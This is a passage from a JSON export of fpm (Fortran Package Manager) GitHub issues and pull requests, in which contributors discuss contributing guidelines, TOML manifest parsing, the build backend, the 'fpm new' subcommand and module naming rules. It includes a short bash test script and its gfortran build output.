            "text": "adds a draft for contributing guidelines for fpm\n\nI have written those guidelines from scratch some time ago, they appeared first in this LGPL licensed project. I can contribute them under MIT license or any other fitting license for fpm.\nFeel free to push to this branch to adjust the guidelines to your liking.\ncloses #158",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 13:39:28+00:00",
                    "text": "Thank you @awvwgk. Most of it we can use but can be condensed without losing meaning. I'll take the next stab at it.\nI prefer not requiring signed commits. If anything, we can say in the guidelines something like:\n\nBy contributing to fpm, you certify that you own or are allowed to share the content of your contribution under the fpm license.\n\n@certik what do you think?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:13:39+00:00",
                    "text": "I agree with @milancurcic that self-signed commits is not necessary. Everything else I think is fine."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 17:51:30+00:00",
                    "text": "I reused most of @awvwgk material and added concrete workflow steps. Let me know what you all think."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 20:42:29+00:00",
                    "text": "@milancurcic I really like the guidelines you made out of this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-08 18:37:41+00:00",
                    "text": "Unless there are objections, I will merge this tomorrow this time."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 14:52:28+00:00",
                    "text": "Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 159,
            "user": "urbanjost",
            "date": "2020-09-02 22:25:55+00:00",
            "title": "Pull request for urbanjost",
            "text": "Add CLI interface and functional subcommand \"new\"\nAdded POSIX interface for implementing mkdir, chdir, and filename\nsplitting; which is problematic as it makes it system-dependent.\nUse gfortran chdir, getcwd extensions and a command-based mkdir\ninstead?\nChanged behavior of \"new\" to allow updating and warn instead of\noverwrite existing files. Early on the Haskell version wiped out\nsome existing README.md and other files; looks like it now stops\nif not creating new directory instead?\nThe build option is failing with the TOML changes. I thought I\ntried it and it worked but a new version I checked out fails as well.\nINC\nrun,build,new work on POSIX machine with no dependencies",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-14 21:03:04+00:00",
                    "text": "Instead of committing existing projects into fpm, I suggest we simply depend on them. We will ensure that fpm can create a nice self-contained tarball that just builds using cmake (or any other build system) to bootstrap (#123)."
                }
            ]
        },
        {
            "number": 158,
            "user": "awvwgk",
            "date": "2020-09-02 17:10:31+00:00",
            "title": "Add a contributing guideline",
            "text": "This project is currently missing resources for to learn about the preferred workflows or the style guide. At least for me a contributing guideline is a strong factor I consider before contributing to a project. In my opinion it helps set the right expectations and cuts down the noise in PRs required to educate new contributors.\nIt would be nice to have at least a short guideline in the README or in a separate CONTRIBUTING file to establish some rules for this project.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:39:17+00:00",
                    "text": "That's a great idea. Any chance you could put one together for us?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 17:52:15+00:00",
                    "text": "For reference, here's what we have in stdlib.\nWhat do you think about something along the lines of:\n\nOpen an issue to discuss the scope of the changes, API if applicable, etc.;\nReach consensus;\nOpen a PR with the changes, while following the fpm style guide (TODO);\nRequest 1-3 reviewers on the PR."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:21:51+00:00",
                    "text": "@everythingfunctional I have written one, I found myself reusing for many of my projects in various flavours, see here. Feel free to adjust it for fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 00:35:23+00:00",
                    "text": "I don't see any major issues with that one. If other contributors agree, I'd be fine with adopting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 08:50:57+00:00",
                    "text": "I have no problem with your contributor guide @awvwgk but can you add a section like 'Workflow' which incorporates what Milan posted? I would also add the following to the workflow:\n\nAfter reaching consensus on an issue discussion, assign the issue to yourself to indicate to others that you have started work on that issue to avoid duplicate effort"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 10:51:22+00:00",
                    "text": "I can open a PR and make the branch editable for repository maintainers, such that you can adjust the guide to your liking."
                }
            ]
        },
        {
            "number": 157,
            "user": "awvwgk",
            "date": "2020-09-01 21:22:02+00:00",
            "title": "Implement reading of fpm.toml",
            "text": "Uses my TOML library to read the fpm.toml file and creates a Fortran type representing the TOML document.\nThis PR adds toml-f as dependency to fpm.\nCloses #149",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 21:44:12+00:00",
                    "text": "This is super exciting, thanks a lot @awvwgk! I look forward to reviewing it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-01 21:56:37+00:00",
                    "text": "Not sure on the scope of this PR, currently it allows to translate and verify any TOML document as fpm package file, but does not do much with this information.\nThe next step would be to pull in a dependency and translate and verify its package file, which would require to create new fpm \u201cinstances\u201d to recursively build the complete dependency tree. Giving the git_target_t a fetch method is easy, but working with the created target is a bit more involved, so this might be somewhat out-of-scope for this PR.\nRegarding coding style, any conventions I should apply (mainly w.r.t. indentation)?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:52:17+00:00",
                    "text": "@awvwgk thanks a lot for this PR! We will review it soon. I think the scope is ok as it is, and we can build upon it with further PRs once it is merged."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 08:19:58+00:00",
                    "text": "Guess it is ready for review than.\nThe current style guide I'm mostly following is this one: https://github.com/dftbplus/develguide/blob/master/docs/fortranstyle.rst"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 15:37:20+00:00",
                    "text": "We follow the stdlib style guide. I skimmed through the contributions and didn't see anything that jumps out except the indentation width (we use 4)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 16:55:18+00:00",
                    "text": "Thanks, this is helpful. I've amended the commit accordingly to keep the history clean."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:23:52+00:00",
                    "text": "I didn't dive super deep into it, but from the high level, it looks reasonably similar to the Haskell version, so I think it's probably at least headed in the right direction.\nI do have one question though. Would it be possible to write some unit tests for this? Feed it a toml string and make sure the package object is correct, feed it bad toml and make sure it reports an error, etc."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 20:18:32+00:00",
                    "text": "Sure can do."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 21:30:02+00:00",
                    "text": "That looks good for now. I was hoping it wouldn't require writing to the file, but it's ok for now. It's a slick little minimalist testing framework you put together too."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:39:20+00:00",
                    "text": "toml_parse can read a string too, but it would require to overload or bypass the read_package_file procedure just for testing. Having a dedicated version for testing toml-f in fpm but not the actual version used for fpm somewhat defeats the purpose of the test for me, therefore writing the file it is.\nI need to work on a better constructor for toml_table types upstream so one can easily build a TOML document without having to read it from a file. But this is something for a future PR once I figured it out in toml-f."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 09:06:41+00:00",
                    "text": "Good idea, manifest is probably a better name than config, I will adjust this.\nFeel free to squash the PR into one commit to avoid the noise of renaming files."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:54:40+00:00",
                    "text": "@awvwgk @everythingfunctional @LKedward Should this PR go before or after #155? Is either way easier than the other? I can't tell."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:56:42+00:00",
                    "text": "I think this PR should go first because it's bigger. I'll then merge the changes into my branch. (Only conflict between the two is fpm.f90 I think.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 16:24:49+00:00",
                    "text": "They are solving different problems, the order does not matter too much, but a conflict in fpm.f90 is inevitable, due to the current status of the project. I do not mind rebasing my branch either.\nSince #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 16:30:22+00:00",
                    "text": "Since #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency.\n\nThis isn't a problem; parsing the manifest is more important than Fortran fpm building itself.\nI already know what changes I need to make in #155 once this PR is merged, hence why I recommend that this be merged first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:05:45+00:00",
                    "text": "If @LKedward is happy to rebase his branch and fix the conflicts, I'd go with this one first. As much as I'd like to have fpm be able to build itself, it's not strictly necessary. We'll get there."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 21:15:12+00:00",
                    "text": "I agree. Let's wait to see if @certik has any objections, and if not we can move forward."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-04 20:42:33+00:00",
                    "text": "I did a quick coverage run on this PR (coverage.txt) and spotted a few issues which were simple oversights. The coverage is currently around 60%, so definitely something to improve."
                },
                {
                    "user": "certik",
                    "date": "2020-09-05 00:09:21+00:00",
                    "text": "I am fine as long as @LKedward is fine, and it seems he his. So we can go ahead and merge this one."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-05 09:27:13+00:00",
                    "text": "Also ready from my side now. I decided to pin the revision of toml-f to a specific commit to ensure that I won't break fpm by changing something in upstream toml-f."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 16:42:59+00:00",
                    "text": "Thank you all and especially @awvwgk. Merging."
                }
            ]
        },
        {
            "number": 155,
            "user": "LKedward",
            "date": "2020-08-26 15:14:21+00:00",
            "title": "[Fortran fpm] Internal dependencies & build backend",
            "text": "Opening a draft PR for feedback.\nImplements:\n\na rudimentary process for scanning sources and determining inter-module dependencies.\na simple fpm backend for building files in correct order\n\nThis is really a minimal working implementation, many places for improvement (particularly source parsing),\nbut it should now build any stand-alone package that only uses the src and app directories (no subdirectories).\nA nice example: fortran fpm can now build itself. Run fpm run --args 'build' with Haskell fpm.\nOther changes:\n\nMoved filesystem and string routines into separate modules for now - these will eventually be substituted by stdlib routines.\n\nNot yet implemented:\n\nnon-default layouts (requires fpm.toml)\nfpm model structure\nPackage layout constraints\nLibrary archiving\nIncremental builds\nBuild output directory\n\nTested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-08-26 15:41:42+00:00",
                    "text": "Thanks a lot Laurence. I only did a cursory read through for now and have a few suggestions:\n\nFor split() and lower() from ``M_strings by @urbanjost, should we import them as a dependency instead of in source? This would mean that fpm-fortran wouldn't be able to build itself (we can't download dependencies yet), but this seems to me like an unnecessary requirement for now. The advantage is that we have less code to maintain. Or would you prefer to keep it in source until we can download dependencies, and then replace them with use M_strings, only: lower, split?\nFPM -> fpm everywhere (source file names and modules), as per #77.\nShoud we rename module environment in environment.f90 to fpm_environment in fpm_environment.f90?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-26 17:49:03+00:00",
                    "text": "Thanks for the comments @milancurcic! I agree with you on all points."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-26 19:34:02+00:00",
                    "text": "This is a great start, and a great next step. Thanks @LKedward .\nI agree with @milancurcic for FPM -> fpm and environment -> fpm_environment. I'm also in favor of leaving lower and split in source until we can fetch and build dependencies. Since this seems to allow fpm to build itself, I think we should make efforts not to lose that ability again.\nI will try and find time over the next few days to try and look into the CI failures a bit more closely and see what's going on."
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 01:18:19+00:00",
                    "text": "Great work! Thank you.\n\nWhere is the fpm_model module? I couldn't find it (on my phone).\n\u2026\nOn Wed, Aug 26, 2020, at 9:14 AM, Laurence Kedward wrote:\n Opening a draft PR for feedback.\n\n Implements:\n\n  * a rudimentary process for scanning sources and determining\n inter-module dependencies.\n  * a simple fpm backend for building files in correct order\n This is really a minimal working implementation, many places for\n improvement (particularly source parsing),\n but it should now build any stand-alone package that only uses the\n `src` and `app` directories (no subdirectories).\n\n A nice example: fortran `fpm` can now build itself. Run `fpm run --args\n 'build'` with Haskell `fpm`.\n\n Other changes:\n\n  * Moved filesystem and string routines into separate modules for now -\n these will eventually be substituted by stdlib routines.\n Not yet implemented:\n\n  * non-default layouts (requires `fpm.toml`)\n  * fpm model structure\n  * Package layout constraints\n  * Library archiving\n  * Incremental builds\n  * Build output directory\n Tested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).\n\n You can view, comment on, or merge this pull request online at:\n\n   #155\n\n Commit Summary\n\n  * Restructure: move some routines out of fpm module.\n  * Use temporary file for directory listing output.\n  * Minor fix: to read_lines subroutine.\n  * Add: Sourcefiles module for processing sources.\n  * Minor fix: to count_rows in filesystem mod.\n  * Add: initial fpm build backend.\n  * Add: initial support for c sources.\n  * Minor fix: add dependency pointer guard.\n File Changes\n\n  * *A* fpm/src/FPM_Backend.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-475cc582fa5d31afd70a27d7efa178df> (49)\n  * *A* fpm/src/FPM_Filesystem.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-051a34076927ef0e96a561c89801de72> (125)\n  * *A* fpm/src/FPM_Sourcefiles.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-7e8ed2fd5212f618126c139653c2f364> (375)\n  * *A* fpm/src/FPM_Strings.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e1790889afd1b0c2e62f82231394fa23> (195)\n  * *M* fpm/src/environment.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-32b40b492690c8c8294e981a0fb78e70> (14)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (134)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/155.patch\n  * https://github.com/fortran-lang/fpm/pull/155.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#155>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4WICQDIJWIZZH6DDSCURF5ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-27 01:59:46+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits"
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 04:35:16+00:00",
                    "text": "That was the most important module I wanted to look at. ;)\n\u2026\nOn Wed, Aug 26, 2020, at 7:59 PM, Brad Richardson wrote:\n\n\n Yep, @certik <https://github.com/certik> is correct. It looks like the\n `fpm_model` module got missed with the commits\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH7POTCLAX6LUPAVHDSCW4Z7ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-27 12:03:30+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits\n\nSorry yes, I'll push an update later that works with an initial fpm_model structure (it only has the dependency structure in currently).\nI don't mind use M_Strings as a dependency or keeping it self-contained for now - @certik do you have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:50:40+00:00",
                    "text": "@LKedward do you want to finish this PR, so that others can build upon it once it is merged?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-02 10:57:57+00:00",
                    "text": "I've added fpm_ prefix to all modules as discussed and implemented a minimal structure for fpm_model, currently with hard-coded values - I think this should be refined in a separate PR. For now I've left the string routines in.\nCurrently having issues building with Haskell fpm which is causing CI to fail, but otherwise I think this is ready for review.\nIf necessary, I'm happy to rebase this PR after #157 is merged."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:19:20+00:00",
                    "text": "I reviewed in more detail and I think this is good to go. I also made the following changes:\n\nExplicit imports with use ..., only: ...\nExplicitly list public names with the public statement\nRemove a few unused module imports\n\nThere are no semantic changes to the code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:45:44+00:00",
                    "text": "Many thanks Milan! I'll be sure to follow those guidelines in future."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:50:24+00:00",
                    "text": "@LKedward I don't think we even had these in the style guide but I think we should."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-07 09:31:43+00:00",
                    "text": "I've now successfully merged in the recent changes so that fortran fpm can now build slightly more complex packages like the hello_complex example package. This is enough for this PR, so I won't be contributing any more of my own changes to this branch unless requested."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-08 11:01:27+00:00",
                    "text": "Many thanks for the helpful review comments @awvwgk, I've addressed all except the exit codes - am I misunderstanding you here?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-08 11:43:13+00:00",
                    "text": "@LKedward I did a bit of further testing and actually trying to break the implementation, see #167, the report is regarding bootstrap fpm but is also not working well with this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-11 15:38:22+00:00",
                    "text": "Thanks for the review @certik, I've implemented your suggestions for isolating the model definition from the frontend."
                },
                {
                    "user": "certik",
                    "date": "2020-09-11 15:42:21+00:00",
                    "text": "Thanks. Looks good now. +1 to merge\n\u2026\nOn Fri, Sep 11, 2020, at 9:38 AM, Laurence Kedward wrote:\n\n\n Thanks for the review @certik <https://github.com/certik>, I've\n implemented your suggestions for isolating the model definition from\n the frontend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHWQ4NDOV6BSDJ35ETSFJAAFANCNFSM4QL6FSFA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-11 20:19:39+00:00",
                    "text": "@everythingfunctional Please merge when ready, in case you're still reviewing."
                }
            ]
        },
        {
            "number": 154,
            "user": "milancurcic",
            "date": "2020-08-20 18:00:00+00:00",
            "title": "Implement fpm new",
            "text": "Should be a low-hanging fruit and easy project.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-08-31 03:09:17+00:00",
                    "text": "I tried implementing the command line parsing I could discern from the Haskell fpm(1) using a parsing module I have and implemented the \"fpm new\" subcommand trying to stay true to the current structure of the fpm Fortran skeleton. I also had it ech the parsed arguments in the unimplimented commands.  I could not get this to push out put I have not done that all that many times so if anyone is interested in that  clone https://github.com/urbanjost/M_CLI2.git and ignore the rest of it but just look in the fpm.cli/ directory."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-08 00:23:36+00:00",
                    "text": "I put a branch on called urbanjost that has a \"new\" subcommand. Lots of questions about what it should do when given an existing directory, like an existing github repository you want to convert to use fpm(1); to test it I added a CLI interface and did some tweeking of the \"run\" and \"build\" subcommands, but just minimal enough to run the output from a \"new\" subcommand\" and a simple project with no dependencies. It also allows for an \"-- options\" instead of -args \" options\". The biggest issues are how to implement MKDIR, CHDIR, and GETCWD. CHDIR and GETCWD exist as extensions in gfortran, for example. I used some existing POSIX-like interfaces I had, but that limits portability unless similar functions are added to stdlib. Thought it would be useful for discussing how it should best be implimented. So I guess it gets into #135, #138, as well as #154 all in\n#159.  No smarts about the order of compilation or pulling packages/ dependencies but at least it actually lets you try out a \"new\" command concept. I was thinking maybe a -license switch might be nice for common licenses; and was thinking the default README.md might include links to the fpm page and maybe  some other links as a more complete example of a markdown file, but unless a specific platform like github was selected I am not sure the markdown syntax between repositories is standardized enough to do that. Anyway, learned some things about how to use the TOML interface. Hope this might be useful for discussion. When it is done, fpm(1) is going to be an interesting code. There are enough interesting problems there just getting it to the state of the Haskell prototype that I might actually look at the Haskell code out of curiosity to see how it was done. Anyway, I find coded examples a good way to discuss potential solutions, so thought this would work as a way to discuss some possible approaches for this. Apparently the CLI is going to be done using other approaches, but if there is any interest I think this is actually a full implementation of the CLI (Cocmmand Line Interface)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 02:17:04+00:00",
                    "text": "Were you saying you wanted to implement this or that you think it is a good candidate for early implimentation?\nI have some ideas on how I would want it to act with an extension to how it works with an existing directory for someone migrating to supporting fpm. I would like to put it in as a draft on the PR page or discuss some of it with you if you are working on it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-24 03:28:00+00:00",
                    "text": "Are you asking Milan?\n\nIn general I would say go ahead and implement things. If you open a PR with an early implementation, everybody can collaborate there.\n\u2026\nOn Wed, Sep 23, 2020, at 8:17 PM, urbanjost wrote:\n\n\n Were you saying you wanted to implement this or that you think it is a\n good candidate for early implimentation?\n I have some ideas on how I would want it to act with an extension to\n how it works with an existing directory for someone migrating to\n supporting fpm. I would like to put it in as a draft on the PR page or\n discuss some of it with you if you are working on it.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#154 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHWTCJQKZEJOEKZUMLSHKT23ANCNFSM4QGN4EIA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-24 04:01:48+00:00",
                    "text": "@urbanjost sorry that I wasn't clear. I'm not working on it and I'm happy that you are. I agree with Ondrej, considering that fpm new has a simple and well defined API, you can go ahead with the PR."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 06:18:16+00:00",
                    "text": "Great. I will create a PR called \"NEW\". Unfortunately, I will have to include the PR \"CLI\" to have a model that can implement the \"new\" subcommand; which is not yet approved. Perhaps I should just delete \"CLI\" and do \"NEW\"?\nSomething weird is happening with the MSWindows build of \"CLI\" to boot; but I think I can do \"NEW\" and probably \"RUN\" pretty quickly far enough and I think others can extend \"build\" and should have pretty complete \"new\",\"run\" . I am going to add a --list option to \"run\" for discussion about using such as option for piping into a command like GNU/Linux xargs(1) command and/or creating a --mask to make it easier to use fpm(1) with other utilitilies. On Linux I might want to have a way to use gdb, valgrind, maybe profiling ?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 08:13:26+00:00",
                    "text": "Perhaps I should just delete \"CLI\" and do \"NEW\"?\n\nIf possible I would prefer that we keep the \"CLI\" pull request so that it can be reviewed separately."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:33:44+00:00",
                    "text": "Started a NEW before I saw this post. Have had some issues with the CLI PR building that @everythingfunctional seems to have been resolved and exposed an issue with quoting of arguments containing spaces after the -- argument, but if I get that sorted out I have a prototype for NEW that builds, runs, and tests. This bash(1) script actually ran with just the Fortran code and I think it will run or test a Haskell fpm directory too, which was a pleasant surprise. I pretty much just copied some of the lines from the build command and made a few guesses. Not like it pulls remote repositories and builds them or does a topological sort and builds in the right order or anything; but I hope this is a step forward. If you play with it it raises some interesting questions about what a new command should do in an existing directory, if a new pathname can be a full pathname, if you should be able to ask for a new setup that is any of the prototypes on the web page, whether an option to write some of the common LICENSE files would be useful -- I think there are some good discussions there just using this basic PR.\n#!/bin/bash\n##################################################\n(\nexec &2>1\nset -x -v\nfpm-new new asdf --with-executable --with-test\ncd asdf\nfpm-new build\nfpm-new run\nfpm-new test\nfpm-new run --list\nfpm-new test --list\nfpm-new run --list --release\nfpm-new test --list --release\nfpm-new build --release\nfpm-new run --list --release\nfpm-new test --list --release\n)|tee -a $0\n##################################################\nexit\n\nmkdir -p asdf\ncd asdf\nmkdir -p asdf/src\nfpm::new asdf/src/asdf.f90 already exists. Not overwriting\nfpm::new asdf/.gitignore already exists. Not overwriting\nfpm::new asdf/README.md already exists. Not overwriting\nmkdir -p asdf/test\nfpm::new asdf/test/main.f90 already exists. Not overwriting\nmkdir -p asdf/app\nfpm::new asdf/app/main.f90 already exists. Not overwriting\nfpm::new asdf/fpm.toml already exists. Not overwriting\ncd asdf;git init\nReinitialized existing Git repository in /tmp/asdf/.git/\ngfortran -c src/asdf.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/asdf/asdf.f90.o\ngfortran -c app/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/app/main.o\ngfortran build/gfortran_debug/app/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/app/asdf\ngfortran -c test/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/test/main.o\ngfortran build/gfortran_debug/test/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/test/runTests\nbuild/gfortran_debug/app/asdf\nHello, asdf!\nbuild/gfortran_debug/test/runTests\nPut some tests in here!\nfpm::run:executable expected at build/gfortran_debug/app/asdf exists\nfpm::run:test expected at build/gfortran_debug/test/runTests exists\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\ngfortran -c src/asdf.f90  -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/asdf/asdf.f90.o\ngfortran -c app/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/app/main.o\ngfortran build/gfortran_release/app/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/app/asdf\ngfortran -c test/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/test/main.o\ngfortran build/gfortran_release/test/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/test/runTests\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\n\nIf the CLI PR gets OKed I will merge NEW into a new PR I guess. I could pull this back but if anyone has some time to preview it I am curious about what anyone thinks.  I am hoping this can actually complete #154 sans some of the new questions it raises actually being able to try it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:15:39+00:00",
                    "text": "Closing as implemented in #189."
                }
            ]
        },
        {
            "number": 153,
            "user": "everythingfunctional",
            "date": "2020-08-17 18:48:04+00:00",
            "title": "Prevent Name Collisions Between Packages",
            "text": "In #86, it became clear that we'd like a solution to prevent name collisions of modules between packages. Starting this thread here to discuss solutions.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 19:03:45+00:00",
                    "text": "My preferred solution would just be that all modules in a library must start with the name of the library. Thus, you may have a module that is just the same name as the library. This is likely to be a common design; organize your library however you like, expose the public API via a module with the same name as the library."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 19:28:02+00:00",
                    "text": "I agree, I think this is the way to go.\nStructuring the module and file names as we did so far helps emulate namespaces and subpackages, but I don't see a good reason to enforce it. The user can still do it if they prefer."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 20:06:40+00:00",
                    "text": "Here is the \"minimal\" proposal:\nAll module names must start with the library name, in particular the module name should be equal to:\n\neither the library name and underscore, such as stdlib_* or toml_*\nor just the library name, such as stdlib or toml\n\nDo we all agree with this \"minimal\" proposal?\nI do. If we all do, we have something to solve our immediate problem, which is name collisions between packages. This gives us time to discuss naming conventions, which I think is important to have, but that's a separate issue."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-18 07:46:44+00:00",
                    "text": "I agree, this is a good solution."
                }
            ]
        },
        {
            "number": 152,
            "user": "urbanjost",
            "date": "2020-08-15 19:11:15+00:00",
            "title": "examples with multiple executables and tests",
            "text": "I had created fpm.toml files that worked, but apparently were not correct toml files. With help from @LKedward I changed my list of executables to an array in several fpm.toml files which now passes tests as standard toml and still works; but when I try the same syntax with multiple test programs my tests are ignored. It is probably something simple but it took me a while just trying empirically to get everything running initially with multiple programs (realizing each one had to be in a seperate directory and so on). I was thinking I am not the only one likely to have these problems and that a more extensive example on this site showing the proper/preferred way to have multiple test programs and application executables would help avoid the problem and give me a solution. The first use I have made of TOML is for these fpm files so even if I get something to work I am not particularly confident it will be the \"right\" way.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-08-16 00:01:54+00:00",
                    "text": "Thanks for reporting the issue. I agree we need better examples and tests.\n\u2026\nOn Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n\n\n I had created fpm.toml files that worked, but apparently were not\n correct toml files. With help from @LKedward\n <https://github.com/LKedward> I changed my list of executables to an\n array in several fpm.toml files which now passes tests as standard toml\n and still works; but when I try the same syntax with multiple test\n programs my tests are ignored. It is probably something simple but it\n took me a while just trying empirically to get everything running\n initially with multiple programs (realizing each one had to be in a\n seperate directory and so on). I was thinking I am not the only one\n likely to have these problems and that a more extensive example on this\n site showing the proper/preferred way to have multiple test programs\n and application executables would help avoid the problem and give me a\n solution. The first use I have made of TOML is for these fpm files so\n even if I get something to work I am not particularly confident it will\n be the \"right\" way.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ>."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-08-16 08:56:56+00:00",
